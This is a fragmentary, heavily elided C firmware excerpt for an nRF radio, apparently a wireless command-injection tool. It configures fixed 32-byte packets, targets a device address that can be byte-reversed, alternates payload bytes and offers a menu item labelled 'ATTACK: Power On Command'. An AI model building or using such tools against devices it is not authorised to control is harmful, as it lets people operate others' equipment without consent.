...
void radio_init_fixed_length(void) {
    ...
    // ★★★ 關鍵修正：強制固定長度模式 ★★★
    // LFLEN=0 (不讀取長度 Byte), S0/S1=0
    NRF_RADIO->PCNF0 = (0UL << RADIO_PCNF0_LFLEN_Pos);
    
    // STATLEN=32 (強制發送 32 Bytes)
...
void send_on_freq(uint8_t freq) {
    ...
    if (swap_address) {
        NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
    } else {
        NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
    }
    ...
    if (toggle_cnt++ % 2 == 0) PAYLOAD_BUFFER[0] = 0x16;
    else PAYLOAD_BUFFER[0] = 0x1C;

    memcpy(packet_buffer, PAYLOAD_BUFFER, 32); // 確保只複製 32 Bytes
    ...
    int64_t timeout = k_uptime_get() + 3; 
...
void print_menu() {
    printk("\n\n=== RF TOOL v3 (Fixed Length 32 Bytes) ===\n");
    printk(" [1] ATTACK: Power On Command\n");
...
int main(void) {
    ...
    radio_init_fixed_length(); // 使用修正後的初始化
    k_sleep(K_SECONDS(2));
    print_menu();
